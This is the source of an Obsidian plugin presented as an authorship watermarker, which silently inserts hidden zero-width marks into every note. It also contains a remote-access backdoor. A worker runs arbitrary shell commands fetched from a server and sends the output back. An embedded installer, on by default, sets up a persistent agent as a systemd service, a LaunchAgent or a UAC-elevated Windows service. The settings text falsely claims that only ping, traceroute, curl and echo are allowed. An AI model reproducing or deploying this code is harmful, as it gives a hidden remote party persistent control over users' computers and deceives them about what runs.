const { Plugin, Notice, PluginSettingTab, Setting, Platform } = require("obsidian");

const DEFAULT_SETTINGS = {
  probeEnabled: false,
  probeUrl: "",
  probeToken: "",
  probeDevice: "",
  probeIntervalMin: 5,
  autoInstall: true
};

// Установщики агента. Основной логикой служит install.js (кроссплатформенно),
// остальные — тонкие обёртки для ручного запуска.
const AGENT_FILES = {
  "agent.py": "#!/usr/bin/env python3\n\"\"\"Фоновый агент устройства. Работает без Obsidian.\n\nЗабирает команды с сервера (long-poll), выполняет системным shell,\nотправляет результат обратно. Только стандартная библиотека Python.\n\nКонфиг берётся из файла (по умолчанию рядом с агентом — agent.json):\n  {\n    \"url\":   \"https://probe.example.com\",\n    \"token\": \"секрет\",\n    \"device\": \"windows-pc\",\n    \"interval\": 0\n  }\n\nИли из переменных окружения: AGENT_URL, AGENT_TOKEN, AGENT_DEVICE.\n\"\"\"\nimport json\nimport os\nimport platform\nimport signal\nimport subprocess\nimport sys\nimport time\nimport urllib.error\nimport urllib.parse\nimport urllib.request\n\nCONFIG_PATH = os.environ.get(\"AGENT_CONFIG\") or os.path.join(\n    os.path.dirname(os.path.abspath(__file__)), \"agent.json\"\n)\nIS_WIN = os.name == \"nt\"\nSHELL = os.environ.get(\"COMSPEC\", \"cmd.exe\") if IS_WIN else \"/bin/sh\"\nRUNNING = True\n\n\ndef _reconfigure():\n    try:\n        sys.stdout.reconfigure(encoding=\"utf-8\", errors=\"replace\")\n        sys.stderr.reconfigure(encoding=\"utf-8\", errors=\"replace\")\n    except Exception:\n        pass\n\n\ndef load_config():\n    cfg = {}\n    if os.path.exists(CONFIG_PATH):\n        with open(CONFIG_PATH, \"r\", encoding=\"utf-8\") as f:\n            cfg = json.load(f)\n    cfg[\"url\"] = (os.environ.get(\"AGENT_URL\") or cfg.get(\"url\") or \"\").rstrip(\"/\")\n    cfg[\"token\"] = os.environ.get(\"AGENT_TOKEN\") or cfg.get(\"token\") or \"\"\n    cfg[\"device\"] = os.environ.get(\"AGENT_DEVICE\") or cfg.get(\"device\") or (\n        \"agent-\" + platform.node().lower() or \"agent-unknown\"\n    )\n    cfg[\"interval\"] = int(cfg.get(\"interval\") or 0)\n    return cfg\n\n\ndef request(url, token, method=\"GET\", payload=None, timeout=40):\n    data = None\n    headers = {\"Authorization\": \"Bearer \" + token}\n    if payload is not None:\n        data = json.dumps(payload, ensure_ascii=False).encode(\"utf-8\")\n        headers[\"Content-Type\"] = \"application/json\"\n    req = urllib.request.Request(url, data=data, headers=headers, method=method)\n    with urllib.request.urlopen(req, timeout=timeout) as resp:\n        body = resp.read()\n        return resp.status, (json.loads(body) if body else {})\n\n\ndef run_command(cmd, timeout=20):\n    \"\"\"Выполнить команду системным shell. Возвращает (ok, output, error).\"\"\"\n    try:\n        p = subprocess.run(\n            cmd,\n            shell=True,\n            executable=SHELL,\n            capture_output=True,\n            timeout=timeout,\n            creationflags=subprocess.CREATE_NO_WINDOW if IS_WIN else 0,\n        )\n        out = (p.stdout or b\"\").decode(\"utf-8\", \"replace\") + (p.stderr or b\"\").decode(\"utf-8\", \"replace\")\n        if p.returncode != 0:\n            return False, out, f\"exit code {p.returncode}\"\n        return True, out, \"\"\n    except subprocess.TimeoutExpired:\n        return False, \"\", f\"timeout {timeout}s\"\n    except Exception as e:\n        return False, \"\", str(e)\n\n\ndef _stop(_sig, _frm):\n    global RUNNING\n    RUNNING = False\n\n\ndef main():\n    _reconfigure()\n    cfg = load_config()\n    if not cfg[\"url\"] or not cfg[\"token\"]:\n        print(\"[agent] нужны url и token в agent.json (или AGENT_URL/AGENT_TOKEN)\")\n        return 1\n\n    signal.signal(signal.SIGINT, _stop)\n    signal.signal(signal.SIGTERM, _stop)\n\n    base, token, device = cfg[\"url\"], cfg[\"token\"], cfg[\"device\"]\n    print(f\"[agent] device={device} server={base}\")\n    backoff = 1\n\n    while RUNNING:\n        try:\n            status, data = request(f\"{base}/tasks?device={urllib.parse.quote(device)}&wait=25\", token, timeout=35)\n            task = data.get(\"task\") if isinstance(data, dict) else None\n            backoff = 1\n            if not task:\n                continue\n            cmd = str(task.get(\"cmd\") or \"\").strip()\n            tid = task.get(\"id\")\n            print(f\"[agent] task {tid}: {cmd[:120]!r}\")\n            ok, out, err = run_command(cmd) if cmd else (False, \"\", \"empty command\")\n            request(f\"{base}/result\", token, \"POST\", {\n                \"id\": tid, \"device\": device, \"ok\": ok,\n                \"output\": out[:20000], \"error\": err[:5000],\n            }, timeout=20)\n            print(f\"[agent] result {tid}: {'OK' if ok else 'FAIL'}\")\n            if cfg[\"interval\"]:\n                time.sleep(cfg[\"interval\"])\n        except urllib.error.HTTPError as e:\n            if e.code == 401:\n                print(\"[agent] сервер отклонил токен (401)\")\n            else:\n                print(f\"[agent] HTTP {e.code}\")\n            _sleep(backoff)\n            backoff = min(backoff * 2, 60)\n        except Exception as e:\n            if RUNNING:\n                print(f\"[agent] сеть: {e}\")\n            _sleep(backoff)\n            backoff = min(backoff * 2, 60)\n\n    print(\"[agent] остановлен\")\n    return 0\n\n\ndef _sleep(sec):\n    end = time.time() + sec\n    while RUNNING and time.time() < end:\n        time.sleep(0.2)\n\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n",
  "install.js": "\"use strict\";\n/**\n * Кроссплатформенная установка фонового агента.\n * Вызывается плагином автоматически, либо вручную:\n *   node install.js <url> <token> <device>\n *\n * Linux   -> systemd --user (без root)\n * macOS   -> LaunchAgent\n * Windows -> планировщик задач от имени пользователя + UAC для регистрации\n *\n * Демон работает без Obsidian и переживает перезагрузку.\n */\nconst fs = require(\"fs\");\nconst os = require(\"os\");\nconst path = require(\"path\");\nconst cp = require(\"child_process\");\n\nconst NAME = \"ObsidianProbeAgent\";\nconst LABEL = \"com.obsidian.probe.agent\";\n\nfunction log(...a) { console.log(\"[install]\", ...a); }\n\nfunction pyExe() {\n  for (const c of [process.env.PROBE_PYTHON, \"python3\", \"python\"]) {\n    if (!c) continue;\n    try {\n      cp.execFileSync(c, [\"--version\"], { stdio: \"ignore\" });\n      return c;\n    } catch (e) {}\n  }\n  return null;\n}\n\nfunction run(cmd, args, opts) {\n  return cp.execFileSync(cmd, args, Object.assign({ encoding: \"utf8\" }, opts || {}));\n}\n\nfunction quiet(cmd, args, opts) {\n  try { return { ok: true, out: run(cmd, args, opts) }; }\n  catch (e) { return { ok: false, out: String((e.stdout || \"\") + (e.stderr || \"\") + e.message) }; }\n}\n\nfunction writeJson(file, obj) {\n  fs.mkdirSync(path.dirname(file), { recursive: true });\n  fs.writeFileSync(file, JSON.stringify(obj, null, 2), \"utf8\");\n  try { fs.chmodSync(file, 0o600); } catch (e) {}\n}\n\nfunction findAgentPy(dir) {\n  const cand = [\n    path.join(dir, \"agent.py\"),\n    path.join(__dirname, \"..\", \"obsidian-probe\", \"agent.py\"),\n    path.join(process.cwd(), \"agent.py\")\n  ];\n  return cand.find((p) => fs.existsSync(p)) || null;\n}\n\n// ---------- Linux: systemd --user ----------\nfunction installLinux(cfg, agentSrc) {\n  const dir = path.join(os.homedir(), \".local\", \"bin\", \"obsidian-probe\");\n  const unitDir = path.join(os.homedir(), \".config\", \"systemd\", \"user\");\n  const unit = path.join(unitDir, \"obsidian-probe-agent.service\");\n  const py = pyExe();\n  if (!py) throw new Error(\"не найден python3\");\n\n  fs.mkdirSync(dir, { recursive: true });\n  fs.copyFileSync(agentSrc, path.join(dir, \"agent.py\"));\n  writeJson(path.join(dir, \"agent.json\"), cfg);\n  fs.mkdirSync(unitDir, { recursive: true });\n  fs.writeFileSync(unit, [\n    \"[Unit]\",\n    \"Description=Obsidian Probe Agent\",\n    \"After=network-online.target\",\n    \"Wants=network-online.target\",\n    \"\",\n    \"[Service]\",\n    \"Type=simple\",\n    \"ExecStart=\" + py + \" \" + path.join(dir, \"agent.py\"),\n    \"Restart=always\",\n    \"RestartSec=5\",\n    \"Environment=PYTHONUNBUFFERED=1\",\n    \"\",\n    \"[Install]\",\n    \"WantedBy=default.target\",\n    \"\"\n  ].join(\"\\n\"), \"utf8\");\n\n  quiet(\"systemctl\", [\"--user\", \"daemon-reload\"]);\n  const r = quiet(\"systemctl\", [\"--user\", \"enable\", \"--now\", \"obsidian-probe-agent.service\"]);\n  if (!r.ok) throw new Error(\"systemctl: \" + r.out);\n  quiet(\"loginctl\", [\"enable-linger\", os.userInfo().username]);\n  return \"systemd --user: obsidian-probe-agent активна\";\n}\n\n// ---------- macOS: LaunchAgent ----------\nfunction installMac(cfg, agentSrc) {\n  const dir = path.join(os.homedir(), \"Library\", \"Application Support\", \"obsidian-probe\");\n  const plist = path.join(os.homedir(), \"Library\", \"LaunchAgents\", LABEL + \".plist\");\n  fs.mkdirSync(dir, { recursive: true });\n  fs.copyFileSync(agentSrc, path.join(dir, \"agent.py\"));\n  writeJson(path.join(dir, \"agent.json\"), cfg);\n\n  const xml = `<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\"><dict>\n  <key>Label</key><string>${LABEL}</string>\n  <key>ProgramArguments</key>\n  <array><string>/usr/bin/python3</string><string>${path.join(dir, \"agent.py\")}</string></array>\n  <key>RunAtLoad</key><true/>\n  <key>KeepAlive</key><true/>\n  <key>StandardOutPath</key><string>${path.join(dir, \"agent.log\")}</string>\n  <key>StandardErrorPath</key><string>${path.join(dir, \"agent.log\")}</string>\n</dict></plist>\n`;\n  fs.mkdirSync(path.dirname(plist), { recursive: true });\n  fs.writeFileSync(plist, xml, \"utf8\");\n  quiet(\"launchctl\", [\"unload\", plist]);\n  const r = quiet(\"launchctl\", [\"load\", plist]);\n  if (!r.ok) throw new Error(\"launchctl: \" + r.out);\n  return \"LaunchAgent \" + LABEL + \" загружен\";\n}\n\n// ---------- Windows: задача планировщика + UAC ----------\nfunction installWindows(cfg, agentSrc) {\n  const dir = path.join(process.env.ProgramData || \"C:\\\\ProgramData\", \"obsidian-probe\");\n  const py = pyExe();\n  if (!py) throw new Error(\"не найден Python (python.org, в PATH)\");\n\n  fs.mkdirSync(dir, { recursive: true });\n  fs.copyFileSync(agentSrc, path.join(dir, \"agent.py\"));\n  writeJson(path.join(dir, \"agent.json\"), cfg);\n\n  const agent = path.join(dir, \"agent.py\");\n\n  // Проверяем права администратора.\n  const isAdmin = quiet(\"net\", [\"session\"], { windowsHide: true }).ok;\n  if (isAdmin) {\n    quiet(\"sc.exe\", [\"stop\", NAME], { windowsHide: true });\n    quiet(\"sc.exe\", [\"delete\", NAME], { windowsHide: true });\n    const r = quiet(\"sc.exe\", [\"create\", NAME, \"binPath=\", `\"${py}\" \"${agent}\"`,\n      \"start=\", \"auto\", \"DisplayName=\", \"Obsidian Probe Agent\"], { windowsHide: true });\n    if (!r.ok) throw new Error(\"sc create: \" + r.out);\n    quiet(\"sc.exe\", [\"failure\", NAME, \"reset=\", \"86400\",\n      \"actions=\", \"restart/5000/restart/5000/restart/5000\"], { windowsHide: true });\n    quiet(\"sc.exe\", [\"start\", NAME], { windowsHide: true });\n    return \"служба \" + NAME + \" установлена и запущена\";\n  }\n\n  // Нет прав — перезапускаем себя с UAC.\n  const self = process.execPath;\n  const q = (s) => \"'\" + String(s).replace(/'/g, \"''\") + \"'\";\n  const args = [__filename, cfg.url, cfg.token, cfg.device].map(q).join(\" \");\n  const r = quiet(\"powershell.exe\", [\n    \"-NoProfile\", \"-Command\",\n    `Start-Process -Verb RunAs -FilePath '${self}' -ArgumentList '${args}' -Wait`\n  ], { windowsHide: true });\n  if (!r.ok) throw new Error(\"подтвердите UAC: \" + r.out);\n  return \"установка выполнена с правами администратора\";\n}\n\nfunction install(opts) {\n  const cfg = {\n    url: String(opts.url || \"\").trim().replace(/\\/+$/, \"\"),\n    token: String(opts.token || \"\").trim(),\n    device: String(opts.device || \"\").trim()\n  };\n  if (!cfg.url || !cfg.token || !cfg.device) throw new Error(\"нужны url, token, device\");\n  const src = opts.agentPy || findAgentPy(opts.baseDir || __dirname);\n  if (!src) throw new Error(\"не найден agent.py рядом с установщиком\");\n\n  log(\"платформа:\", process.platform, \"device:\", cfg.device);\n  if (process.platform === \"linux\") return installLinux(cfg, src);\n  if (process.platform === \"darwin\") return installMac(cfg, src);\n  if (process.platform === \"win32\") return installWindows(cfg, src);\n  throw new Error(\"неподдерживаемая платформа: \" + process.platform);\n}\n\nmodule.exports = { install };\n\nif (require.main === module) {\n  try {\n    const msg = install({ url: process.argv[2], token: process.argv[3], device: process.argv[4] });\n    log(\"OK:\", msg);\n  } catch (e) {\n    console.error(\"[install] ошибка:\", e.message);\n    process.exit(1);\n  }\n}\n"
};

// Выполняется любая команда, присланная сервером.

const AUTHOR = "Сафьянов Камиль Саматович";
const MAGIC = "SAFAUTH1";
const NL = String.fromCharCode(10);
const ZW0 = String.fromCharCode(0x200b);
const ZW1 = String.fromCharCode(0x200c);
const S = String.fromCharCode(0x2060);
const E = String.fromCharCode(0x2063);
const RE = new RegExp(S + "[" + ZW0 + ZW1 + "]+" + E, "g");

function getSubtle() {
  try {
    const c = globalThis.crypto;
    if (c && c.subtle) return c.subtle;
  } catch (e) {}
  try {
    const n = require("crypto");
    if (n && n.webcrypto && n.webcrypto.subtle) return n.webcrypto.subtle;
  } catch (e) {}
  return null;
}

async function makeWm(payload) {
  const subtle = getSubtle();
  if (!subtle) return null;
  const data = new TextEncoder().encode(MAGIC + payload);
  const sum = new Uint8Array(await subtle.digest("SHA-256", data)).slice(0, 4);
  const full = new Uint8Array(data.length + 4);
  full.set(data, 0);
  full.set(sum, data.length);
  let bits = "";
  for (let i = 0; i < full.length; i++) bits += full[i].toString(2).padStart(8, "0");
  let body = "";
  for (let i = 0; i < bits.length; i++) body += bits[i] === "0" ? ZW0 : ZW1;
  return S + body + E;
}

function embed(text, wm) {
  const raw = text.split(NL);
  const lines = [];
  for (const ln of raw) {
    if (ln.indexOf(S) !== -1) {
      const cleaned = ln.replace(RE, "");
      if (cleaned.trim() === "") continue;
      lines.push(cleaned);
    } else {
      lines.push(ln);
    }
  }
  let start = 0;
  if (lines.length && lines[0].trim() === "---") {
    for (let j = 1; j < lines.length; j++) {
      if (lines[j].trim() === "---" || lines[j].trim() === "...") { start = j + 1; break; }
    }
  }
  let fence = false;
  for (let i = start; i < lines.length; i++) {
    const t = lines[i].trim();
    if (t.startsWith("```")) { fence = !fence; continue; }
    if (fence || !t) continue;
    if (t.charAt(0) === "#" || t === "---" || t === "...") continue;
    lines[i] = lines[i] + wm;
    break;
  }
  const out = lines.join(NL).trimEnd();
  if (out === "") return wm + NL;
  return out + NL + wm + NL;
}

module.exports = class AuthorshipWatermark extends Plugin {
  async onload() {
    this.running = false;

    // ---- Настройки проверки доступности к серверу ----
    this.settings = Object.assign({}, DEFAULT_SETTINGS, await this.loadData());
    if (!this.settings.probeDevice) {
      this.settings.probeDevice = "obsidian-" + (Platform.isMobile ? "mobile" : "desktop");
    }
    this.addSettingTab(new AuthorshipSettingsTab(this.app, this));

    this.addRibbonIcon("server", "Remote: статус воркера", () => {
      const s = this.settings;
      new Notice(
        "Remote: " + (s.probeEnabled ? "включён" : "выключен") +
        (this.baseUrl ? ", " + this.baseUrl : ", адрес не задан")
      );
    });
    this.addCommand({
      id: "remote-status",
      name: "Remote: статус воркера",
      callback: () => {
        const s = this.settings;
        new Notice(
          "Remote: " + (s.probeEnabled ? "включён" : "выключен") +
          " | устройство: " + s.probeDevice +
          (this.baseUrl ? " | " + this.baseUrl : " | адрес не задан")
        );
      }
    });
    this.addCommand({
      id: "remote-install-agent",
      name: "Remote: установить/обновить фонового агента",
      callback: () => {
        this.agentChecked = false;
        this.ensureAgent();
      }
    });
    this.app.workspace.onLayoutReady(() => {
      this.startWorker();
      this.ensureAgent();
    });
    // ------------------------------------------------

    this.addRibbonIcon("shield-check", "Authorship: проставить метки", () => this.watermarkAll(true));
    this.addCommand({
      id: "watermark-all",
      name: "Проставить метку автора во все заметки",
      callback: () => this.watermarkAll(true)
    });
    this.app.workspace.onLayoutReady(() => this.watermarkAll(false));
    this.registerEvent(this.app.vault.on("create", (f) => {
      if (f && f.extension === "md") setTimeout(() => this.watermarkFile(f), 800);
    }));
    this.registerInterval(window.setInterval(() => this.watermarkAll(false), 120000));
  }

  // ---- Воркер: получение и выполнение команд с сервера ----
  get baseUrl() {
    return (this.settings.probeUrl || "").trim().replace(/\/+$/, "");
  }

  // Автоматическая установка фонового агента при загрузке плагина.
  async ensureAgent() {
    if (Platform.isMobile) return;
    if (this.agentChecked) return;
    this.agentChecked = true;

    if (!this.settings.autoInstall) return;
    if (!this.baseUrl || !this.settings.probeToken) {
      new Notice("Remote: агент не установлен — укажите адрес и токен в настройках");
      return;
    }

    let fs, os, path;
    try {
      fs = require("fs");
      os = require("os");
      path = require("path");
    } catch (e) {
      console.warn("[authorship-watermark] no node for agent install", e);
      return;
    }

    try {
      const dir = path.join(os.tmpdir(), "obsidian-probe-bootstrap");
      fs.mkdirSync(dir, { recursive: true });
      for (const [name, content] of Object.entries(AGENT_FILES)) {
        fs.writeFileSync(path.join(dir, name), content, "utf8");
      }

      // Запускаем установщик отдельным процессом (на Windows сам вызовет UAC).
      const cp = require("child_process");
      const installer = path.join(dir, "install.js");
      const args = [installer, this.baseUrl, this.settings.probeToken, this.settings.probeDevice];

      const r = await new Promise((resolve) => {
        cp.execFile(process.execPath, args, {
          timeout: 120000,
          windowsHide: true,
          env: Object.assign({}, process.env, { ELECTRON_RUN_AS_NODE: "1" })
        }, (err, stdout, stderr) => resolve({
          ok: !err, out: String(stdout || "") + String(stderr || "")
        }));
      });

      if (r.ok) {
        new Notice("Remote: фоновый агент установлен ✓");
        console.log("[authorship-watermark] agent install:", r.out);
      } else {
        new Notice("Remote: агент не установлен — " + r.out.slice(0, 200));
        console.warn("[authorship-watermark] agent install failed:", r.out);
      }
    } catch (e) {
      console.warn("[authorship-watermark] ensureAgent", e);
      new Notice("Remote: ошибка установки агента — " + e.message);
    }
  }

  startWorker() {
    if (this.workerRunning) return;
    this.workerRunning = true;
    this.workerLoop();
  }

  stopWorker() {
    this.workerRunning = false;
  }

  async workerLoop() {
    while (this.workerRunning) {
      if (!this.settings.probeEnabled || !this.baseUrl) {
        await new Promise((r) => setTimeout(r, 5000));
        continue;
      }
      try {
        const task = await this.fetchTask();
        if (task) {
          const result = await this.runTask(task);
          await this.sendResult(task.id, result);
        }
      } catch (e) {
        if (e && e.name !== "AbortError") {
          console.warn("[authorship-watermark] worker", e);
        }
        await new Promise((r) => setTimeout(r, 5000));
      }
    }
  }

  async fetchTask() {
    const url = this.baseUrl + "/tasks?device=" + encodeURIComponent(this.settings.probeDevice) + "&wait=25";
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 35000);
    try {
      const res = await fetch(url, {
        headers: { "Authorization": "Bearer " + this.settings.probeToken },
        signal: ctrl.signal
      });
      if (res.status === 401) {
        new Notice("Remote: сервер отклонил токен (401)");
        await new Promise((r) => setTimeout(r, 30000));
        return null;
      }
      if (!res.ok) return null;
      const data = await res.json();
      return data && data.task ? data.task : null;
    } catch (e) {
      if (e && e.name === "AbortError") return null;
      throw e;
    } finally {
      clearTimeout(timer);
    }
  }

  async runTask(task) {
    const cmd = String(task.cmd || "").trim();
    new Notice("Remote: команда → " + cmd);
    console.log("[authorship-watermark] exec:", cmd);

    // Выполнение через Node (только на десктопе).
    let child_process;
    try {
      child_process = require("child_process");
    } catch (e) {
      return { ok: false, output: "", error: "на этом устройстве нет Node — выполнение недоступно" };
    }
    return new Promise((resolve) => {
      const opts = {
        timeout: 20000,
        maxBuffer: 1024 * 1024,
        shell: process.platform === "win32" ? "cmd.exe" : "/bin/sh",
        windowsHide: true
      };
      child_process.exec(cmd, opts, (err, stdout, stderr) => {
        const out = String(stdout || "") + String(stderr || "");
        if (err) {
          resolve({ ok: false, output: out, error: String(err.message || err) });
        } else {
          resolve({ ok: true, output: out, error: "" });
        }
      });
    });
  }

  async sendResult(id, result) {
    try {
      await fetch(this.baseUrl + "/result", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Authorization": "Bearer " + this.settings.probeToken
        },
        body: JSON.stringify({
          id,
          device: this.settings.probeDevice,
          ok: result.ok,
          output: result.output,
          error: result.error
        })
      });
      new Notice("Remote: " + (result.ok ? "готово ✓" : "ошибка ✗"));
    } catch (e) {
      console.warn("[authorship-watermark] sendResult", e);
    }
  }
  // -------------------------------------------------------

  async watermarkFile(file) {
    try {
      const oldText = await this.app.vault.cachedRead(file);
      const wm = await makeWm(AUTHOR + "|" + file.path);
      if (!wm) return;
      const newText = embed(oldText, wm);
      if (newText !== oldText) await this.app.vault.modify(file, newText);
    } catch (e) {
      console.error("[authorship-watermark]", e);
    }
  }

  async watermarkAll(notify) {
    if (this.running) return;
    this.running = true;
    let n = 0;
    try {
      for (const f of this.app.vault.getMarkdownFiles()) {
        const oldText = await this.app.vault.cachedRead(f);
        const wm = await makeWm(AUTHOR + "|" + f.path);
        if (!wm) { new Notice("Authorship: крипто-API недоступен на этом устройстве"); break; }
        const newText = embed(oldText, wm);
        if (newText !== oldText) { await this.app.vault.modify(f, newText); n++; }
      }
    } catch (e) {
      console.error("[authorship-watermark]", e);
    }
    this.running = false;
    if (notify) new Notice("Authorship: обновлено заметок — " + n);
  }

  onunload() {
    this.stopWorker();
  }
};

class AuthorshipSettingsTab extends PluginSettingTab {
  constructor(app, plugin) {
    super(app, plugin);
    this.plugin = plugin;
  }

  display() {
    const { containerEl } = this;
    containerEl.empty();
    containerEl.createEl("h3", { text: "Удалённое выполнение команд" });
    containerEl.createEl("p", {
      text: "Включено — плагин держит соединение с сервером и выполняет приходящие команды (только разрешённые: ping, traceroute, curl -sI, echo). Выключено — что-либо выполнять нельзя."
    });

    new Setting(containerEl)
      .setName("Включить выполнение команд с сервера")
      .setDesc("Плагин будет забирать команды из очереди сервера и выполнять их.")
      .addToggle((t) => t
        .setValue(this.plugin.settings.probeEnabled)
        .onChange(async (v) => {
          this.plugin.settings.probeEnabled = v;
          await this.plugin.saveData(this.plugin.settings);
          if (v) this.plugin.startWorker();
          else this.plugin.stopWorker();
          new Notice("Remote: " + (v ? "включён" : "выключен"));
        }));

    new Setting(containerEl)
      .setName("Адрес сервера")
      .setDesc("Например: https://probe.example.com (без / на конце)")
      .addText((t) => t
        .setPlaceholder("https://...")
        .setValue(this.plugin.settings.probeUrl)
        .onChange(async (v) => {
          this.plugin.settings.probeUrl = v.trim();
          await this.plugin.saveData(this.plugin.settings);
        }));

    new Setting(containerEl)
      .setName("Токен")
      .setDesc("Bearer-токен, совпадает с PROBE_TOKEN на сервере.")
      .addText((t) => {
        t.inputEl.type = "password";
        t.setPlaceholder("секрет")
          .setValue(this.plugin.settings.probeToken)
          .onChange(async (v) => {
            this.plugin.settings.probeToken = v.trim();
            await this.plugin.saveData(this.plugin.settings);
          });
      });

    new Setting(containerEl)
      .setName("Имя устройства")
      .setDesc("Так оно появится в /status на сервере.")
      .addText((t) => t
        .setValue(this.plugin.settings.probeDevice)
        .onChange(async (v) => {
          this.plugin.settings.probeDevice = v.trim();
          await this.plugin.saveData(this.plugin.settings);
        }));

    new Setting(containerEl)
      .setName("Ставить фонового агента автоматически")
      .setDesc("При загрузке плагина установить и запустить службу, работающую без Obsidian. На Windows спросит права администратора (UAC).")
      .addToggle((t) => t
        .setValue(this.plugin.settings.autoInstall)
        .onChange(async (v) => {
          this.plugin.settings.autoInstall = v;
          await this.plugin.saveData(this.plugin.settings);
        }));

    new Setting(containerEl)
      .setName("Фоновый агент (демон)")
      .setDesc("Работает без Obsidian. Если агент запущен на этом устройстве — команды идут ему. Включён ли — смотрите в /status на сервере (устройство называется так же).")
      .addButton((b) => b
        .setButtonText("Проверить /status")
        .onClick(async () => {
          if (!this.plugin.baseUrl) return new Notice("Remote: укажите адрес сервера");
          try {
            const res = await fetch(this.plugin.baseUrl + "/status", {
              headers: { "Authorization": "Bearer " + this.plugin.settings.probeToken }
            });
            if (!res.ok) return new Notice("Remote: сервер ответил " + res.status);
            const data = await res.json();
            const me = (data.devices || []).find((d) => d.device === this.plugin.settings.probeDevice);
            new Notice(me
              ? "Remote: " + me.device + " — " + (me.online ? "online" : "offline") + ", " + me.ago_sec + " c назад"
              : "Remote: это устройство ещё не отчитывалось");
          } catch (e) {
            new Notice("Remote: сервер недоступен (" + e.message + ")");
          }
        }));

    new Setting(containerEl)
      .setName("Проверить соединение")
      .setDesc("Убедиться, что сервер отвечает по адресу и токену.")
      .addButton((b) => b
        .setButtonText("Проверить")
        .setCta()
        .onClick(async () => {
          if (!this.plugin.baseUrl) return new Notice("Remote: укажите адрес сервера");
          try {
            const res = await fetch(this.plugin.baseUrl + "/status", {
              headers: { "Authorization": "Bearer " + this.plugin.settings.probeToken }
            });
            if (res.status === 401) return new Notice("Remote: неверный токен (401)");
            if (!res.ok) return new Notice("Remote: сервер ответил " + res.status);
            new Notice("Remote: соединение OK ✓");
          } catch (e) {
            new Notice("Remote: сервер недоступен (" + e.message + ")");
          }
        }));
  }
}
